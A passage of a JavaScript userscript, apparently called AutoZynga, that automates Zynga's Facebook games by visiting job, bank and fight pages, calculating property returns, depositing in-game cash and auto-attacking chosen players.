	var userIdInstructions="User IDs(not user name).  Click with the right mouse button on the link to the users profile & copy link.  Then paste it here and remove everything but the last numbers. (ie. 123456789)";
	controlHtml+="<div id='AutoZyngaPaused' style='display: none'><b>Paused on mouse click.</b><br /><a href='javascript:;' id='AutoZyngaRestart' >Click here to restart</a></div>";
	controlHtml+="<img title='"+bankInstructions1+"' src='http://mwdirectfb10.static.zynga.com/mwfb/graphics/icon_cash_16x16_01.gif' /><input type='text' id='MinInCash' title='"+bankInstructions1+"' />";
	controlHtml+="<br /><img title='"+bankInstructions2+"' src='http://facebook2.pirates.static.zynga.com/graphics/icon-blood.gif' /><input type='text' id='MinToBank' title='"+bankInstructions2+"' /><br />";
	controlHtml+="<img title='"+healthInstructions+"' src='http://mwdirectfb10.static.zynga.com/mwfb/graphics/icon_health_16x16_01.gif' /><input type='text' id='MinToHospital' size='3' title='"+healthInstructions+"' /><br />";
	controlHtml+="<img src='http://mwdirectfb10.static.zynga.com/mwfb/graphics/icon_stamina_16x16_01.gif' /><input type='checkbox' id='AutoZyngaFightTargetFM'  "+(this.GetFightTarget()=="freshmeat"?"checked":"")+" />Fresh Meat"+
		" or UserIDs below..."+
		"<textarea title='"+userIdInstructions+"' type='text' id='AutoZyngaFightTarget' rows='6'>"+this.GetFightTarget()+"</textarea>"+
//		"<br />"+
//		"<input type='checkbox' id='DivAtBottom' "+(this.GetDivAtBottom()?"checked":"")+" />Show this block at the bottom"+
		"<br />";
	controlHtml+="<input type='checkbox' id='AutoZyngaDisabled' />Disable auto run for this game.<br />";
	
	this.SetControl(
		controlHtml
	);

	var minToBank=document.getElementById('MinToBank');
	if(minToBank!=undefined) {
		minToBank.value=this.GetMinToBank().toString();
		minToBank.addEventListener('change',function(e) {
			Zynga.GMSetValue('MinToBank',e.target.value);
		},false);
	}
	var minInCash=document.getElementById('MinInCash');
	if(minInCash!=undefined) {
		minInCash.value=this.GetMinInCash().toString();
		minInCash.addEventListener('change',function(e) {
			Zynga.GMSetValue('MinInCash',e.target.value);
		},false);
	}

	var minToHospital=document.getElementById('MinToHospital');
	if(minToHospital!=undefined) {
		minToHospital.value=this.GetMinToHospital().toString();
		minToHospital.addEventListener('change',function(e) {
			Zynga.GMSetValue('MinToHospital',e.target.value);
		},false);
	}

	var disabledBox=document.getElementById('AutoZyngaDisabled');
	disabledBox.checked=this.GetGameDisabled()?true:false;
	disabledBox.addEventListener('change',function(e) {
		Zynga.GMSetValue('disabled',e.target.checked);
	},false);

/*	
	var divAtBottom=document.getElementById('DivAtBottom');
	divAtBottom.checked=this.GetDivAtBottom()?true:false;
	divAtBottom.addEventListener('change',function(e) {
		Zynga.GMSetValue('DivAtBottom',e.target.checked);
	},false);
*/

	var fightTarget=document.getElementById('AutoZyngaFightTarget');
	fightTarget.addEventListener('change',function(e) {
		Zynga.SaveFightTarget();
	},false);

	var fightTargetFM=document.getElementById('AutoZyngaFightTargetFM');
	fightTargetFM.addEventListener('change',function(e) {
		fightTarget.value=fightTargetFM.checked?"freshmeat":"";
		Zynga.SaveFightTarget();
	},false);

	var autoZyngaRestart=document.getElementById('AutoZyngaRestart');
	var autoZyngaPaused=document.getElementById('AutoZyngaPaused');
	autoZyngaRestart.addEventListener('click',function(e) {
		autoZyngaPaused.style.display='none';
		Zynga.CheckPage();
	},false);
	
	controlDiv.addEventListener('mousedown',function(e) {
		nHtml.clearTimeouts();
		autoZyngaPaused.style.display='block';
	},false);
	
},

SaveFightTarget:function() {
	var fightTarget=document.getElementById('AutoZyngaFightTarget');
	Zynga.GMSetValue('FightTarget',fightTarget.value);
},


VisitJobPage:function() {
	var content=document.getElementById('content');
	if(!content) { return false; }

	this.GMSetValue('GoJobs',0);
	// schoolofmagic: href=/actions
	// streetracing: onclick=jobs.php
	if(this.totalJobs>0) { 
		// we're already in the job page.
		return false; 
	}
	
	var a=nHtml.FindByAttrContains(content,'a','href','/actions');
	var useHref=true;
	if(!a && this.IsKidsGame()) {
		a=nHtml.FindByAttrXPath(content,'a',"contains(@href,'/jobs.php') or contains(@href,'/quests.php') or contains(@href,'/missions.php')");
		if(a) {
			useHref=true;
		}
	}
	if(!a) {
		// sometimes this is ajax sometimes it isn't.
		// ajax click: footballwars, streetracinggame, 
		// href click: gangwars, fashionwars, prison lockdown.
		if((a=nHtml.FindByAttrContains(content,'a','href','jobs.php'))) {
			//useHref=false;
		}
	}
	if(!a) {
		// castle_age
		if((a=nHtml.FindByAttrContains(content,'a','href','quests.php'))) {
			useHref=false;
		}
	}
	if(!a) {
		// specialforces
		if((a=nHtml.FindByAttrContains(content,'a','onclick','controller=job'))) {
			useHref=false;
		}
	}
	if(!a) {
		// inthemafia
		var d=null;
		if((d=nHtml.FindByAttrContains(content,'div','className','jobs_link'))) {
			var as=d.getElementsByTagName('a');
			if(as.length>0) {
				a=as[0];
				useHref=false;
			}
		}
	}
	if(!a) {
		this.GMLog('Could not find job link');
		return false;
	}
	this.GMLog('VisitJob'+useHref+","+a.href);
	this.waitMilliSecs=12000;
	nHtml.setTimeout(function() {
		if(useHref) {
			Zynga.VisitUrl(a.href);
		} else {
			Zynga.Click(a);
		}
	},2000);
	return true;
},

///////////////////////////////////////////////////////

SelectMaxProperties:function(row) {
	var selects=row.getElementsByTagName('select');
	if(selects.length<1) { return false; }
	
	var select=selects[0];
	select.selectedIndex=select.options.length-1;
	
	return true;
},

PropertiesGetNameFromRow:function(row) {
	// schoolofmagic, etc. <div class=item_title
	var infoDiv=nHtml.FindByAttrXPath(row,'div',"contains(@class,'land_buy_info') or contains(@class,'item_title')");
	if(!infoDiv) {
		// robhood, etc.
		infoDiv=nHtml.FindByAttrXPath(row,'td',"contains(@class,'property_name')");
		if(infoDiv) {
			return infoDiv.textContent.trim();
		}
	}
	if(!infoDiv) {
		// in the mafia
		infoDiv=row;
	}
	if(infoDiv.className.indexOf('item_title')>=0) {
		return infoDiv.textContent.trim();
	}
	var strongs=infoDiv.getElementsByTagName('strong');
	if(strongs.length<1) {
		return null;
	}
	return strongs[0].textContent.trim();
},
IterateProperties:function(func) {
	var isKidsGame=this.IsKidsGame();
	// castle age, under world: class='land_buy_row'
	var content=document.getElementById('content');
	var ss=document.evaluate(".//tr[contains(@class,'land_buy_row')]",content,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	if(!ss || ss.snapshotLength<=0) {
		// inthemafia, tryPropertyPurchase
		// piratesrule, onsubmit = properties.php
		// vampiresgame, action = properties.php
//		ss=document.evaluate(".//input[@name='action' and @value='buy']",content,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
		ss=document.evaluate(".//form[contains(@action,'properties.php') "+
			"or contains(@action,'/Market/Buy') "+
			// school of magic
			"or (contains(@action,'/Market/Transact') and contains(@action,'=investment')) "+
			"or contains(@onsubmit,'properties.php') "+
			"or contains(@onsubmit,'tryPropertyPurchase') "+
			"or (contains(@id,'_form') and contains(@id,'BUY')) "+
			"or (contains(@action,'xw_controller=property') and contains(@action,'xw_action=buy'))]",
			content,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	}

	//var costRe=new RegExp('$([0-9,]+)');
	var builtOnRe=new RegExp('(Built On|Consumes|Requires):\\s*([^<]+)','i');
	var propByName={};
	var propNames=[];

	var gameName=this.GameName();
	this.GMDebug('property forms found:'+ss.snapshotLength);
	for(var s=0; s<ss.snapshotLength; s++) {
		var row=ss.snapshotItem(s);
		if(!row) { continue; }


		if(row.tagName=='INPUT' || row.tagName=="FORM") {
			// inthemafia
			row=row.parentNode;
			while(row.tagName!="BODY") {
				if(isKidsGame) {
					if(row.tagName=="TR" && 
						row.className=='normal_row') {
						break;
					}
				} else if(gameName=="piratesrule") {
					if(row.style.width=='100%') {
						break;
					}
				} else {
					// inthemafia, class=main_table
					// vampiresgame, class=main
					// schoolofmagic,etc. class=article_item
					if(row.tagName=="TR" && 
						(row.parentNode.parentNode.className=='main_table'
						|| row.parentNode.parentNode.className=='main'
						|| row.parentNode.parentNode.className=='action_table'
						|| row.className=='land_buy_row'
						)
					) { 
						break; 
					}
				}
				row=row.parentNode;
			}
			if(row.tagName=="BODY") { continue; }
		}

		var div=nHtml.FindByAttrXPath(row,'div',"contains(@class,'AutoZynga_propDone')");
		if(div) { continue; }

		var name=this.PropertiesGetNameFromRow(row);

		if(name==null || name=='') { continue; }

		var moneyss=document.evaluate(".//*[contains(@class,'money') or contains(@class,'currency') or contains(@class,'gold')]",row,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
		if(!moneyss || moneyss.snapshotLength==0) {
			moneyss=document.evaluate(".//*[contains(@class,'label')]",row,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
		}

		if(moneyss.snapshotLength<2) { continue; }

		div=document.createElement('div');
		div.className='AutoZynga_propDone';
		div.style.display='none';
		moneyss.snapshotItem(0).appendChild(div);

		var nums=[];
		var numberRe=new RegExp("([0-9,]+)");
		for(var sm=0; sm<moneyss.snapshotLength; sm++) {
			var income=moneyss.snapshotItem(sm);
			if(income.className.indexOf('label')>=0) {
				income=income.parentNode;
				var m=numberRe.exec(income.textContent);
				if(m && m.length>=2 && m[1].length>1) {
					// number must be more than a digit or else it could be a "? required" text
					income=this.NumberOnly(m[1]);
				} else {
					//this.GMLog('Cannot find income for: '+name+","+income.textContent);
					income=0;
					continue;
				}
			} else {
				income=this.NumberOnly(income.textContent);
			}
			nums.push(income);
		}

		var income=nums[0];
		var cost=nums[1];
		if(!income || !cost) {
			continue;
		}
		if(gameName=="piratesrule" || income>cost) {
			// income is always less than the cost of property.
			income=nums[1]; cost=nums[0];
		}

		var builtOnM=null;
		if(isKidsGame) {
			var req=nHtml.FindByAttrXPath(row,'span',"contains(@class,'requirement_text')");
			if(req) {
				builtOnM=builtOnRe.exec(req.parentNode);
			}
		} else {
			builtOnM=builtOnRe.exec(row.innerHTML);
		}
		var builtOn=null;
		var builtOnProp=null;
		var totalCost=cost;
		if(builtOnM && builtOnM.length>1) {
			builtOn=nHtml.StripHtml(builtOnM[2]).trim();
			builtOnProp=propByName[builtOn];
			if(builtOnProp) {
				builtOnProp.usedByOther=true;
				totalCost+=builtOnProp.cost;
			} else {
				this.GMLog('Could not find built on:'+builtOn+", for:"+name);
			}
		}

		var prop={'row':row,'name':name,'income':income,'cost':cost,'totalCost':totalCost,'builtOn':builtOnProp,'usedByOther':false};
		propByName[name]=prop;
		propNames.push(name);
	}

	for(var p=0; p<propNames.length;p++) {
		func.call(this,propByName[propNames[p]]);
	}
	return propByName;
},

BuyProperty:function(prop) {
	if(prop.builtOn!=null && prop.builtOn.builtOn==null) {
		// need to build something first.
		return this.BuyProperty(prop.builtOn);
	}
	var button=nHtml.FindByAttrXPath(row,'input',"@type='submit' or @type='image'");
	if(button) {
		this.waitMilliSecs=13000;
		this.Click(button);
		return true;
	}
	return false;
},

DrawProperties:function() {
	if(this.IsOldGame() && location.href.indexOf('/invest')<0) {
		return;
	}

	var bestProp={};
	var propByName=this.IterateProperties(function(prop) {
		this.SelectMaxProperties(prop.row);

		var div=document.createElement('div');
		div.style.display='inline';
		div.className='AutoZynga_costCalc';
		var roi=(parseInt((prop.income/prop.totalCost)*240000) /100);
		div.innerHTML=roi+"% per day.";

		if(!prop.usedByOther) {
			if(!bestProp.roi || roi>=bestProp.roi) {
				bestProp.roi=roi;
				bestProp.prop=prop;
			}
		}

		var infoDiv=nHtml.FindByAttrXPath(prop.row,'div',"contains(@class,'land_buy_info')");
		if(!infoDiv) {
			var st=prop.row.getElementsByTagName('td');
			if(st && st.length>=2) {
				infoDiv=st[1];
			}
		}
		if(!infoDiv) {
			this.GMLog("Cannot find place to insert property price");
			return;
		}
		infoDiv.insertBefore(div,infoDiv.childNodes[0]);
	});

	return null;
},
Properties:function() {
	var autoBuyProperty=this.GMGetValue('autoBuyProperty',0);
	if(autoBuyProperty) {
//~~~ Need to check for enough moneys + do we have enough of the builton type that we already own.
//		this.BuyProperty(bestProp.prop);
	}
	return null;
},

///////////////////////////////////////////////////////

VisitBankPage:function() {
	var content=document.getElementById('content');
	if(!content) { return false; }
	var gameName=this.GameName();
	if(this.IsKidsGame() 
	|| gameName=='spacewarsgame' 
	|| gameName=='footballwars' 
	|| gameName=='prisonlockdowngame' 
	|| gameName=='gangwarsgame' 
	|| gameName=='fashionwarsgame' 
	|| gameName=='heroesvillains') {
		// the bank is no longer visible on all pages.
		this.VisitUrl('bank.php');
		return true;
	}
	
	var bankLink=nHtml.FindByAttrContains(content,'a','href','bank.php');
	var useHref=true;

	if(gameName=='castle_age' || gameName=='glamour_age') {
		// castle_age
		bankLink=nHtml.FindByAttrContains(content,'a','href','keep.php');
	}
	if(gameName=='inthemafia') {
		// inthemafia
		bankLink=nHtml.FindByAttrContains(content,'a','className','bank_deposit');
	}
	if(gameName=="streetracinggame" || gameName=='under_world') {
		if((bankLink=nHtml.FindByAttrContains(content,'a','onclick','stats.php'))) {
			useHref=false;
		}
	}
	if(!bankLink) {
		bankLink=nHtml.FindByAttrContains(content,'a','href','banking');
	}
	if(!bankLink) {
		// mafia wars
		if((bankLink=nHtml.FindByAttrContains(content,'a','onclick','controller=bank'))) {
			useHref=false;
		}
	}

	if(!bankLink) {
		// specialforces we need to go to the stats page first to get to the bank page.
		if((bankLink=nHtml.FindByAttrContains(content,'a','onclick','controller=stats'))) {
			useHref=false;
		}
	}
	if(!bankLink) {
		// the bank page is now in the stats page.
		// spacewarsgame, footballwars, prisonlockdowngame, heroesvillains, gangwarsgame
		bankLink=nHtml.FindByAttrContains(content,'a','href','stats.php');
	}

	if(!bankLink) {
		this.GMLog(' Could not find bank link');
		return false;
	}

	this.GMLog('VisitBank');
	this.waitMilliSecs=12000;
	nHtml.setTimeout(function() {
		if(useHref) {
			Zynga.VisitUrl(bankLink.href);
		} else {
			Zynga.Click(bankLink);
		}
	},2000);
	return true;
},

GetMinToBank:function() {
	var n=this.GMGetValue('MinToBank','');
	if(n==null || n=='') { return ''; }
	return parseInt(n);
},
GetMinInCash:function() {
	var n=this.GMGetValue('MinInCash','');
	if(n==null || n=='') { return 0; }
	return parseInt(n);
},



GetDepositForm:function() {
	var depositForm=nHtml.FindByAttr(document,'div','className','deposit_div');
	if(!depositForm) {
		// footballwars
		depositForm=nHtml.FindByAttrContains(document,'div','id','deposit_div');
	}
	if(!depositForm) {
		// castle_age
		depositForm=nHtml.FindByAttrContains(document,'form','id','bank_deposit');
	}
	if(!depositForm) {
		// robhood, etc.
		depositForm=nHtml.FindByAttrContains(document,'form','id','bankdeposit');
	}
	if(!depositForm) {
		depositForm=nHtml.FindByAttrContains(document,'form','action','/Deposit');
	}
	if(!depositForm) {
		depositForm=nHtml.FindByAttrContains(document,'form','onsubmit','action=deposit');
	}
	if(!depositForm) {
		// castle age
		depositForm=nHtml.FindByAttrContains(document,'input','src','btn_stash');
		if(depositForm) {
			depositForm=nHtml.FindParent(depositForm,function(p) { return p.tagName=="FORM"?true:false; });
		}
	}
	
	return depositForm;
},

Bank:function() {
	var minToBank=this.GetMinToBank();
	var minInCash=this.GetMinInCash();
	if(minToBank=="") {
		return null;
	}
	var depositForm=this.GetDepositForm();
	if(this.stats.cash<=minInCash || this.stats.cash<minToBank) {
/*
		// not enough money for the bank.
		if(depositForm) {
			// let's go back to the mission page.
			this.VisitJobPage();
			return 'GoJob';
		}
*/
		return null;
	}
	// football, spacewars, heroes&villians, fashionwars: href=bank.php, id=*deposit_div, type=submit
	// schoolofmagic: href=banking, form,action=deposit, type=submit
	// streetracing: stats.php, class=deposit_div, input,name=do
	// mafia wars: href...>...bank<, form,onsubmit.action=deposit, type=submit
	// specialforces: a,onclick=controller=bank, form,onsubmit.action=deposit, type=submit

	if(!depositForm) {
		// Cannot find the link
		this.VisitBankPage();
		return "GoDeposit";
	}
	var numberInput=nHtml.FindByAttrXPath(depositForm,'input',"@type='' or @type='text'");
	if(numberInput) {
		numberInput.value=parseInt(numberInput.value)-minInCash;
		this.GMLog("Putting into bank $"+numberInput.value);
	} else {
		this.GMLog('Cannot find box to put in number for bank deposit.');
	}
	var depositButton=nHtml.FindByAttr(depositForm,'input','type','submit');
	if(!depositButton) {
		depositButton=nHtml.FindByAttr(depositForm,'input','name','do');
	}
	if(!depositButton) {
//		depositButton=nHtml.FindByAttr(depositForm,'input','type','submit');
		this.GMLog(' Cannot find deposit submit button');
		return null;	
	}
	this.GMLog('Deposit');
	this.Click(depositButton);
	return 'Deposit';	
},

///////////////////////////////////////////////////////
// Fight


GetFightTarget:function() {
	return this.GMGetValue('FightTarget',"");
},
VisitFightPage:function(force) {
	var content=document.getElementById('content');
	if(!content) { return false; }
	if(!force && this.IsFightPage()) { return false; }
	var useHref=null;
	this.GMLog('Visit fight page');
	var fightLink=nHtml.FindByAttrContains(content,'a','href','fight.php');
	if(!fightLink) {
		fightLink=nHtml.FindByAttrXPath(content,'a',"contains(@href,'xw_controller=fight') and contains(@href,'xw_action=view')");
	}
	if(!fightLink) {
		// inthemafia
		//fightLink=nHtml.FindByAttrXPath(content,'a',"contains(@onclick,'xw_controller=fight') and contains(@onclick,'xw_action=view')")
		if((fightLink=nHtml.FindByAttrContains(content,'div','id','_link_fight_unlock'))) {
			var as=fightLink.getElementsByTagName('a');
			if(as.length>0) {
				fightLink=as[0];
				useHref=false;
			} else {
				fightLink=null;
			}
		}
		if(fightLink) useHref=false;
	}
	if(!fightLink) {
		// castle_age
		fightLink=nHtml.FindByAttrContains(content,'a','href','battle.php');
	}
	if(!fightLink) {
		fightLink=nHtml.FindByAttrContains(content,'a','href','/fight');
	}
	if(!fightLink) {
		this.GMLog("Couldn't find fight page");
		return false;
	}
	if(useHref==null && fightLink.href.indexOf('/html_server.php')>=0) {
		useHref=false;
	}
	
	this.GMLog('VisitFight'+useHref+','+fightLink.href);
	this.waitMilliSecs=12000;
	if(useHref==null || useHref==true) {
		this.VisitUrl(fightLink.href);
	} else if(useHref=='script') {
		this.RunScript(fightLink.getAttribute('onclick'),1000);
	} else {
		this.Click(fightLink);
	}
	return true;
},

/*
IterateFightButtons:function(func) {
	var trs=document.getElementsByTagName('TR');
	for(var t=0; t<trs.length; t++) {
		var tr=trs[t];
		var fightForm=this.FindFightForm(tr,true);
		var fightA=nHtml.FindByAttrXPath(document,"a","contains(@onclick,'xw_controller=fight&xw_action=attack') or contains(@onclick,'directAttack(')");
		var img=nHtml.FindByAttrXPath(document,"img","contains(@src,'battle_02.gif')");

		var ret=func({});
	}
},
*/


userRe:new RegExp("(userId=|user=|/profile/)([0-9]+)"),
IterateFightLinks:function(func) {
	var content=document.getElementById('content');
	if(!content) { return; }

	var ss=document.evaluate(".//a[(contains(@href,'xw_controller=stats') and contains(@href,'xw_action=view')) "+
		"or (contains(@href,'/profile/'))"+
		"or (contains(@href,'/"+this.GameName()+"/profile.php?userId='))"+
		// castle_age
		"or (contains(@href,'/"+this.GameName()+"/keep.php?user='))"+
		// inthemafia
		"or (contains(@href,'user=') and contains(@href,'html_server.php')) "+
		"or (contains(@href,'/stats.php?user='))"+
		"]",content,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	for(var s=0; s<ss.snapshotLength; s++) {
		var userLink=ss.snapshotItem(s);
		if(userLink.innerHTML.indexOf('<img')>=0) { continue; }
		var m=this.userRe.exec(userLink.getAttribute('href'));
		if(!m) { continue; }
		var user=m[2];
		func.call(this,userLink,user);
	}
},
AddFightLinks:function() {
	if(document.getElementById('addFightLink')) { 
		return; 
	}
	this.ClearNotifyFightBox();

	this.IterateFightLinks(function(userLink,user) {
		if(nHtml.FindByAttr(userLink.parentNode,'a','class','addFight')) { return; }

		var addFight=document.createElement('a');
		addFight.className='addFight';
		addFight.id='addFightLink';
		addFight.innerHTML='(Auto Fight)';
		addFight.addEventListener('click',function() {
			var fightTarget=document.getElementById('AutoZyngaFightTarget');
			if(fightTarget.value=="freshmeat") { fightTarget.value=''; }
			if(fightTarget.value!="") { fightTarget.value+="\n"; }
			fightTarget.value+=user;
			Zynga.SaveFightTarget();
		},false);
		userLink.parentNode.insertBefore(addFight,userLink.nextSibling);
		userLink.parentNode.insertBefore(document.createTextNode(' '),userLink.nextSibling);
	});
},

FindFightForm:function(obj,withOpponent) {
	var gameName=this.GameName();
	if(gameName=="streetracinggame" || gameName=="castle_age") { 
		// streetracinggame uses fight.php for banking, points, etc.
		// castle_age uses a fight link, there's a bogus fight.php form there that may confuse us.
		return undefined; 
	}
	var ss=document.evaluate(".//form[(contains(@action,'fight.php')) or contains(@onsubmit,'fight.php') or contains(@action,'Role/Fight')]",obj,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	var fightForm=null;
	for(var s=0; s<ss.snapshotLength; s++) {
		fightForm=ss.snapshotItem(s);
		// ignore forms in overlays
		var p=fightForm;
		while(p) {
			if((p.id && p.id.indexOf('verlay')>=0)
			// vampirewars has fight.php form in bank_wrapper
			|| (p.className && (p.className.indexOf('bank_wrapper')>=0 || p.className.indexOf('popup')>=0))) {
				fightForm=null; break; 
			}
	/*
			if(p.style && (!p.id || p.id.indexOf('verlay')<0) && (p.style.display=='none' || p.style.visibility=='hidden')) { 
				fightForm=null; break; 
			}
	*/
			p=p.parentNode;
		}

		if(!fightForm) {
			continue; 
		}
		var inviteButton=nHtml.FindByAttrXPath(fightForm,"input","(@type='submit' or @name='submit') and (contains(@value,'Invite') or contains(@value,'Notify'))");
		if(inviteButton) {
			// we only want "attack" forms not "attack and invite", "attack & notify"
			fightForm=null;
		}

		if(withOpponent && fightForm) {
			if(fightForm.action && fightForm.action.indexOf('opponentUserID=')<0) {
				var inp=nHtml.FindByAttrXPath(fightForm,"input","@name='opponent_id'");
				if(!inp) {
					fightForm=null;
				}
			}
		}
		if(fightForm) { break; }
	}
	return fightForm;
},

fightLinkXPath:"(contains(@onclick,'xw_controller=fight') and contains(@onclick,'xw_action=attack')) "+
	"or contains(@onclick,'directAttack')"+
	"or contains(@onclick,'_reg_fight_view_attack')"+
	"or contains(@onclick,'_fight_fight(')",
HasAttackButtons:function() {
	var fightForm=this.FindFightForm(document);

	if(!fightForm) {
		// inthemafia
		fightForm=nHtml.FindByAttrXPath(document,"a",this.fightLinkXPath);
	}
	if(!fightForm) {
		// castle_age
		fightForm=nHtml.FindByAttrXPath(document,"img","contains(@src,'battle_0')");
 //or contains(@src,'button_race1v1')		
		
	}
	return fightForm?true:false;
},

IsFightPage:function() {
	if(this.HasAttackButtons()) { return true; }
	var fightForm=nHtml.FindByAttrXPath(document,"table","contains(@class,'fight_table')");
	if(!fightForm) {
		fightForm=nHtml.FindByAttrXPath(document,"input","contains(@src,'battle_01')");
	}
	return fightForm?true:false;
},

ClearNotifyFightBox:function() {
	var box=nHtml.FindByAttrXPath(document,"input","contains(@id,'_notifyUserCheckBox')");
	if(box) { box.checked=false; }
},

opponentIdRe:new RegExp('opponent_id=([0-9]+)','ig'),
FightUserId:function(userid) {
	if(this.VisitFightPage()) { return 'fightpage'; }
	var clickWait=3000;  // this wait is make sure the previous fight has finished before we do this one
	this.GMLog('Fight user:'+userid);
	
	
	var gameName=this.GameName();
/*
	if(gameName=='inthemafia') {
		// inthemafia
//		var xwcity=new RegExp('xw_city=[0-9]+');
		var xwcity=new RegExp('_mw_city_wrapper[^>]*mw_city([0-9]+)');
		var m=xwcity.exec(document.body.innerHTML);
		if(m) {
//			this.VisitUrl(x='/inthemafia/remote/html_server.php?&xw_controller=fight&xw_action=attack&'+m[0]+'&opponent_id='+userid);
//			http://apps.facebook.com/inthemafia/remote/html_server.php?xw_controller=fight&xw_exp_sig=a28ac802841fb2c16a734e8285530a62&xw_time=1250567101&xw_action=attack&xw_city=1&tmp=fa272e98dfed5e9025d42a155895d118&opponent_id=1199474393&action=attack

//this.VisitUrl('http://apps.facebook.com/inthemafia/remote/html_server.php?xw_controller=fight&xw_exp_sig=a28ac802841fb2c16a734e8285530a62&xw_time=1250567101&xw_action=attack&'+m[0]+'&tmp=fa272e98dfed5e9025d42a155895d118&opponent_id='+userid+'&action=attack');

this.VisitUrl('http://apps.facebook.com/inthemafia/remote/html_server.php?xw_controller=fight&xw_exp_sig=a28ac802841fb2c16a734e8285530a62&xw_time=1250567101&xw_action=attack&xw_city='+m[1]+'&tmp=fa272e98dfed5e9025d42a155895d118&opponent_id='+userid+'&action=attack');

//this.VisitUrl('http://apps.facebook.com/inthemafia/remote/html_server.php?xw_controller=fight&xw_action=attack&'+m[0]+'&opponent_id='+userid+'&action=attack');
		} else {
			this.GMLog('Cannot find city');
		}
		return 'fight';
	}
*/

	var fightForm=this.FindFightForm(document,true);
//	var fightForm=nHtml.FindByAttrXPath(document,"form","contains(@action,'fight.php') or contains(@onsubmit,'fight.php') or contains(@action,'Role/Fight')");
	if(fightForm) {
		var oppActionRe=new RegExp('opponentUserID=([0-9]+)','');
		if(oppActionRe.exec(fightForm.action)) {
			fightForm.action=fightForm.action.replace(oppActionRe,'opponentUserID='+userid);
		} else {
			var inp=nHtml.FindByAttrXPath(fightForm,"input","@name='opponent_id'");
			if(!inp)
				inp=nHtml.FindByAttrXPath(fightForm,"input","@name='target_id'");
			if(!inp) {
				this.GMLog('no opponent_id in attack form');
				return null;
			}
			inp.value=userid;
		}

		var button=nHtml.FindByAttrXPath(fightForm,"input",
			"@type='submit' or @type='button'");

		if(button) {
			this.GMLog('Fight user button:'+button.value);
			nHtml.setTimeout(function() { 
				if(gameName=="vampiresgame" || gameName=="gangwarsgame") {
					nHtml.Click(button); 
				} else {
					fightForm.submit();
				}
			},clickWait);
			this.DoFightOverlay();
		} else {
			this.GMLog("Cannot find button for fight");
			return null;
		}
		return 'fight';
	}

	var fightA=nHtml.FindByAttrXPath(document,"a",this.fightLinkXPath);
	if(fightA) {
		var directIdRe=new RegExp('directAttack\\(([a-z]+),\\s*[0-9]+\\)','ig');
//		var fightFightRe=new RegExp("_fight_fight\\(([^,]+),([0-9]+),","i");
		var fightFightRe=new RegExp("(_reg_fight_view_attack|_fight_fight)\\(([^,]+), *([0-9]+),","i");
		
		var opponentIdStr="opponent_id="+userid;
		fightA.href=fightA.href.replace(this.opponentIdRe,opponentIdStr);
		var onclick=fightA.getAttribute('onclick');
		onclick=onclick.toString().replace(this.opponentIdRe,opponentIdStr);
		var directIdM=directIdRe.exec(onclick);
		if(directIdM) {
			var directIdStr="directAttack("+directIdM[1]+", "+userid+")";
			onclick=onclick.replace(directIdRe,directIdStr);
		}

		var fightFightM=fightFightRe.exec(onclick);
		if(fightFightM) {
			var fightFightStr=fightFightM[1]+"("+fightFightM[2]+","+userid+",";
			onclick=onclick.replace(fightFightRe,fightFightStr);
		}

		this.GMLog('fight user a:'+onclick);
		fightA.setAttribute('onclick',onclick);
		nHtml.setTimeout(function() { 
			Zynga.Click(fightA); 
		},clickWait);
		return 'fight';
	}

	// castle_age
	var fightInp=nHtml.FindByAttrXPath(document,"input","contains(@src,'battle_01.gif')");
	if(fightInp) {
		var form=nHtml.FindParent(fightInp,function(obj) { return obj.tagName=="FORM"; });
		if(form) {
			var target=nHtml.FindByAttrXPath(form,"input","@name='target_id'");
			if(target) {
				target.value=userid;
				nHtml.setTimeout(function() {
					Zynga.Click(fightInp);
				},clickWait);
				return 'fight';
			}
		}
	}
	
	// glamour_age
	var img=nHtml.FindByAttrXPath(document,"img","contains(@src,'battle_01.gif')");
	if(img) {
		fightA=img.parentNode.parentNode;
		var confBattleRe=new RegExp('_configureBattle\\(\\s*([0-9]+)','ig');

		var battleIdRe=new RegExp('prepFacebookBattle\\(([0-9]+)','i');
		var battleIdStr='prepFacebookBattle('+userid;
		var onclick=fightA.getAttribute('onclick');
		if(onclick)
			onclick=onclick.toString().replace(battleIdRe,battleIdStr);

		// castle age
		/*
		var confBattleM=confBattleRe.exec(onclick);
		if(confBattleM) {
			var confBattleStr="_configureBattle("+userid;
			onclick=onclick.replace(confBattleRe,confBattleStr);
		}
		*/
		fightA.setAttribute('onclick',onclick);
		this.GMLog('fight user imga:'+onclick);
		nHtml.setTimeout(function() { 
			var s=document.createElement('script');		s.innerHTML='function aaa(event) {\n'+onclick+"\n}\naaa({});";		document.body.appendChild(s);
//				Zynga.Click(fightA); 
		},clickWait);
		return 'fight';
	} else {
		this.VisitFightPage(true);
	}

	return null;
},

DoFightOverlay:function() {
	var gameName=this.GameName();
	if(gameName=="gangwarsgame" || gameName=="vampiresgame") return;
	nHtml.setTimeout(function() {
		var aButton=null;
		if(!aButton) {
			// dragonwars
			aButton=nHtml.FindByAttrXPath(document,"a","contains(@onclick,'face_friend_attack')");
		}
		if(!aButton) {
			var attack_only=nHtml.FindByAttrXPath(document,"div","@class='fresh_meat_overlay_attack_only'");
			if(attack_only) {
				var as=attack_only.getElementsByTagName('a');
				if(as.length>0) {
					aButton=as[0];
				} else {
					Zynga.GMLog('no attack button found');
				}
			} else {
				Zynga.GMLog('no "attack only" div found');
			}
		}
		if(aButton) {
			Zynga.GMLog('Click fight overlay');
			Zynga.Click(aButton);
		}
	},1000);
},

FightFreshmeat:function() {
	var ss=document.evaluate("//span[contains(@class,'fresh_meat_green')]",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	if(ss.snapshotLength<=0) {
		// castle age
		ss=document.evaluate("//img[contains(@src,'battle_01.gif')]",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	}
	if(ss.snapshotLength<=0) {
		// scretagents: rogue agent
		ss=document.evaluate("//tr[(contains(string(),'Fresh Meat') or contains(string(),'Level: Newbie') or contains(string(),'Rogue Agent')) and not(contains(string(),'Auto Attack'))]",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	}
	if(ss.snapshotLength<=0) {
